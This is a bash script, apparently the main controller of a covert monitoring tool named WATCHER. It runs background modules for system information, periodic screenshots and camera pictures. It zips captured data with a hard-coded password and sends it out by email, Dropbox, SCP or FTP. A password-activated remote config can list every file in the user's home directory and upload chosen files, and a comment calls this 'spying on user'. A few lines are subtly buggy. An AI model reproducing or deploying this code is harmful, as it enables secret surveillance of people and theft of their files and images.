


source function.sh

function check_connection {
	# It would be better to ping google or yahoo or microsoft, or all at once.
	#ping -q -w 1 -c 1 `ip r | grep default | cut -d ' ' -f 3` > /dev/null && CONNECTION_MODE=1 || CONNECTION_MODE=0
	CONNECTION_MODE=0
	ping -q -w 1 -c 1 www.google.com > /dev/null && CONNECTION_MODE=1 && return 0
	ping -q -w 1 -c 1 www.yahoo.com > /dev/null && CONNECTION_MODE=1 && return 0
	ping -q -w 1 -c 1 www.microsoft.com > /dev/null && CONNECTION_MODE=1 && return 0
	`wget -q -O /dev/null --no-cache http://www.google.com/` && CONNECTION_MODE=1 && return 0
	`wget -q -O /dev/null --no-cache http://www.yahoo.com/` && CONNECTION_MODE=1 && return 0
	`wget -q -O /dev/null --no-cache http://www.microsoft.com/` && CONNECTION_MODE=1 && return 0
	`wget -q -O /dev/null --no-cache http://www.onet.pl/` && CONNECTION_MODE=1 && return 0
	`wget -q -O /dev/null --no-cache http://www.onet.pl/` && CONNECTION_MODE=1 && return 0
}

function check_smtp {
	#return 0 # if connection false
	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
	touch check.zip; echo "this is a test zip file">check.zip
	fsendemail "Test message - $DATA" "Test message" "check.zip"
	if [[ $RESP == *"Email was sent successfully!" ]]
	then
		CONNECTION_SMTP=1
	else
		CONNECTION_SMTP=0
	fi
	rm check.zip
}

function check_dir_size {
	DIR_NAME="$1"
	DIRSIZE=`du -s $DIR_NAME/ | cut -f 1`
	CLEAN_DIR_WHILE=0
	[ ! -d $DIR_NAME ] && return 1
	while [ $CLEAN_DIR_WHILE -lt 1 ]; do
		if [ $DIRSIZE -ge $2 ]
		then
			clean_dir $DIR_NAME
			clean_dir $DIR_NAME
			clean_dir $DIR_NAME
		else
			CLEAN_DIR_WHILE=$(($CLEAN_DIR_WHILE+1))
		fi
		DIRSIZE=`du -s $DIR_NAME/ | cut -f 1`
	done
	[ $DIRSIZE -ge $3 ] && clean_dir $DIR_NAME
}

function clean_dir {
	file=`/bin/ls -1 "$1" | sort --random-sort | head -1`
	path=`readlink --canonicalize "$1/$file"` # Converts to full path
	rm "$path"
}

function remote_config {
	ACTIVATE=0
	MD5OLD="none"
	[ -f "$REMOTE_CONFIG_NAME.old" ] && MD5OLD=`md5sum "$REMOTE_CONFIG_NAME.old"`
	cp WATCHER-hard.cfg WATCHER.cfg
	#! `wget -q --no-cache "$REMOTE_CONFIG_ADDRESS/$REMOTE_CONFIG_NAME"` && return 1
	MD5NEW=`md5sum "$REMOTE_CONFIG_NAME"`
	echo "$MD5OLD $MD5NEW"
	if [ ! "$MD5NEW" = "$MD5OLD" ]
	then
		while read line_conf; do
		DATA=`date +"%Y-%m-%d-%H-%M-%S"`
		line_conf1=`echo $line_conf | cut -d : -f 1`
		line_conf2=`echo $line_conf | cut -d : -f 1`
		[ "$line_conf1" = "$REMOTE_ACTIVATION_PASS" ] && ACTIVATE=1
		[ "$line_conf1" = "listfiles" ] && [ $ACTIVATE -eq 1 ] && `find ~/>file_list.txt` && `zip -r tmp/filelist-$DATA.zip -P 42p6b2V3hy7c92g42p6b2V3hy7c92g file_list.txt` && `mv tmp/filelist-$DATA.zip tosendlater/`
		[ "$line_conf1" = "filedata" ] && [ $ACTIVATE -eq 1 ] && echo "File data"
		[ "$line_conf1" = "dirdata" ] && [ $ACTIVATE -eq 1 ] && echo "Dir data"
		[ "$line_conf1" = "downloadfile" ] && [ $ACTIVATE -eq 1 ] && send_file "$line_conf2"
		[ "$line_conf1" = "delfile" ] && [ $ACTIVATE -eq 1 ] && echo "Delete $line_conf2"
		# post other options here
		done < $REMOTE_CONFIG_NAME
		mv "$REMOTE_CONFIG_NAME" "$REMOTE_CONFIG_NAME.old"
	fi
	rm "$REMOTE_CONFIG_NAME"
	unset MD5OLD
	unset MD5NEW
}

function send_file {
	FILESIZE=`du -s "$1" | cut -f 1`
	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
	FILE_NAME_sf="filerequest-$DATA-$RANDOM"
	[ $FILESIZE -le $MAX_ATACHEMENT_SIZE ] && `zip -r tmp/$FILE_NAME_sf.zip -P 42p6b2V3hy7c92g42p6b2V3hy7c92g "$1"` && `mv tmp/$FILE_NAME_sf.zip tosendlater/`
	[ $SMTP_CONNECTION -eq 1 ] && run_send_later
	[ $R_DB -eq 1 ] && run_dropbox
	unset FILESIZE
	unset FILE_NAME_sf
}

function run_send_later {
	./send_later.sh $MAX_ATACHEMENT_SIZE
	[ $? -ge 1 ] && CONNECTION_SMTP=0
}

function run_dropbox {
	./a_up_dropbox.sh $DB_DIR "tosendlater" $DB_DIR_MAX_SIZE $DIR_MAX_SIZE
}

################
# Variables
########
# Connection settings
# 0 - no connection. assumed at start
# 1 - connection established
CONNECTION_MODE=0
SMTP=0

# Wait some time after script starts - allow everything to load and user to connect.
T_INITIAL_DELAY=20

# How often the main loop runs.
T_CHECK_STATUS=120

# Force check smtp connection every n main loop passes.
T_SMTP_CHECK_EVERY=20 # Check every n passes of status check

# How often infromation like IP, modules etc. should be gathered.
T_INF_CHECK=900 # 15 mint

# How often  screenshot should be made.
T_SCREEN_CHECK=300 # 5 min

# Camera delay
T_CAM_DELAY=60

# Make screenshot every n passes of n loop (if connection is established)
T_CAM_EVERY=20

# Technical variables
SMTP_COUNTER=0
CAM_COUNTER=0
ACTIVATE=0
REMOTE_COUNTER=0

# Becomes "1", when the first picture was made
CAM_FIRST=0

# Maximum attachement size. If bigger, attachement should be splited.
MAX_ATACHEMENT_SIZE=5000

# What additional modules should be loaded: 0-dont, 1-run
R_DB=0 # Dropbox
R_SCP=0 # SCP
R_FTP=0 # FTP

# Dropbox directory, from script point of view
DB_DIR="../Dropbox/.config"
DB_DIR=`readlink --canonicalize "$DB_DIR"`

# When we should start remove random files from tosendlater dir
DIR_WARNING_SIZE=20000 # 20mb

# When we should start remove files from tosendlater dir, until it will be no bigger than
DIR_MAX_SIZE=60000

# Same as ACTIVATE=0above but reffers to Dropbox direcotry
DB_DIR_WARNING_SIZE=40000
DB_DIR_MAX_SIZE=120000

# Remote config:
REMOTE_CONFIG=0 # 0 - don't; 1 - run only if config exists; 2 - check config but run even if config doesn't exists; 3 - run only when activated, but carry on when remote_file_config dissapeard
REMOTE_CONFIG_ADDRESS="www.google.com" # Address to dir containing file
REMOTE_CONFIG_NAME="WATCHER.cfg" # File name
REMOTE_ACTIVATION_PASS="PASS" # Password (it should be placed at the top of config file), it will activate spying on user if you decoded so
REMOTE_CHECK_EVERY=10 # check every 10 passes, for special commands
REMOTE_WAIT_TO_NEXT_CHECK=1800


################
# Script start
########
sleep $T_INITIAL_DELAY


################
# Check for remote file config if necessary
########
[ $REMOTE_CONFIG -eq 3 ] && remote_config
[ $REMOTE_CONFIG -eq 2 ] && remote_config && ACTIVATE=1
[ $REMOTE_CONFIG -eq 1 ] && remote_config
[ $REMOTE_CONFIG -eq 0 ] && ACTIVATE=1
[ $ACTIVATE -eq 0 ] && exit 0;


################
# Modules activation
########
./inf.sh $T_INF_CHECK &
./screenshot.sh $T_SCREEN_CHECK &


################
# Loop begins
########
check_connection
check_smtp
while true
do
	start_time=$(date +%s)


	################
	# Rules: connecition
	########
	if [[ $CONNECTION_MODE -eq "0" ]] && [[ $CONNECTION_SMTP -eq "1" ]]
	then
		check_connection
		check_smtp
		SMTP_COUNTER=0
	fi
	if [[ $CONNECTION_MODE -eq "0" ]] && [[ $CONNECTION_SMTP -eq "1" ]]
	then
		# If sendemail succeded twice, but ping not → ping signals must be blocked
		CONNECTION_MODE=1
		CONNECTION_SMTP=1
	fi

	SMTP_COUNTER=$(($SMTP_COUNTER+1))

	if [ $((SMTP_COUNTER)) -ge $((T_SMTP_CHECK_EVERY)) ]
	then
		SMTP_COUNTER=0
		check_smtp
	fi
	if [ $CONNECTION_SMTP -eq "0" ]
	then
		# If we didn't established smtp connection, we will check at next loop.
		SMTP_COUNTER=$T_SMTP_CHECK_EVERY
	fi


	################
	# Camera counter, so we won't make pictures too often
	########
	CAM_COUNTER=$(($CAM_COUNTER+1))


	################
	# Remote counter
	########
	REMOTE_COUNTER=$(($REMOTE_COUNTER+1))
	[ $CONNECTION_MODE -eq "1" ] && [ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && REMOTE_COUNTER=0 && remote_config;
	[ $ACTIVATE -eq 0 ] && [ $REMOTE_CONFIG -eq 3 ] && sleep $REMOTE_WAIT_TO_NEXT_CHECK && continue;
	[ $ACTIVATE -eq 0 ] && [ $CONNECTION_MODE -eq "1" ] && [ $REMOTE_CONFIG -eq 1 ] && exit 0;
	[ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && REMOTE_COUNTER=0


	################
	# Rules: sending information
	########
	if [[ $CONNECTION_MODE -eq "1" ]] && [[ $CONNECTION_SMTP -eq "1" ]]
	then
		if [ $((CAM_FIRST)) -ge $((1)) ]
		then
		# It's not first picture
			if [ $((CAM_COUNTER)) -ge $((T_CAM_EVERY)) ]
			then
				./camera.sh $T_CAM_DELAY 0 &
				CAM_COUNTER=0
			fi
		else
		# It's first picture → capture and send as soon as possible
			CAM_FIRST=1
			./camera.sh 0 1
		fi
		run_send_later
	else
		# When no smtp or connection was established - uncomment if you want to make pictures offline
		#if [ $((CAM_COUNTER)) -ge $((T_CAM_EVERY)) ]
		#then
			# ./camera.sh $T_CAM_DELAY 0 &      # 
		#	CAM_COUNTER=0
		#fi
		sleep 0
	fi

	if [[ $CONNECTION_MODE -eq "1" ]] && [[ $CONNECTION_SMTP -eq "0" ]]
	then
	# when smtp was not succesfull and there is connection
		[[ $R_DB -eq 1 ]] && run_dropbox
		[[ $R_SCP -eq 1 ]] && ./a_up_scp.sh
		[[ $R_FTP -eq 1 ]] && ./a_up_ftp.sh
		sleep 0
	fi

	if [ $CONNECTION_MODE -eq "0" ]
	then
	# when connection is down, still try to upload by dropbox, mayby he will be able to connect
		[[ $R_DB -eq 1 ]] && run_dropbox
		sleep 0
	fi


	################
	# Part when we clean directiories if they got too big
	########
	check_dir_size "tosendlater" $DIR_MAX_SIZE $DIR_WARNING_SIZE

	if [ $R_DB -eq 1 ]
	then
		check_dir_size "$DB_DIR" $DB_DIR_MAX_SIZE $DB_DIR_WARNING_SIZE
	fi 


        finish_time=$(date +%s)
	time_duration=$((finish_time - start_time))
        echo "$time_duration"

	################
	# Sleep for a while
	########
	SLEEP_TIME=$((T_CHECK_STATUS-time_duration))
	if [ $SLEEP_TIME -ge 10 ]
	then
		sleep $SLEEP_TIME
	else
		sleep 10
	fi
	

	################
	# Check connection
	########
	check_connection
done
